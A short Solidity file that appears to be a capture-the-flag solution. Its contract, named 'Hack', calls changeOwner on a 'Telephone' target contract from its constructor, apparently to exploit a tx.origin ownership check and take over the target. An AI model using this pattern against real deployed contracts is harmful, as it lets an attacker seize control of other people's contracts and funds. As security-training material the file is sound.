// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function owner() external view returns (address);
    function changeOwner(address) external;
}


contract Hack{
    constructor(address _contractAddress){
        ITelephone(_contractAddress).changeOwner(msg.sender);
    }
}
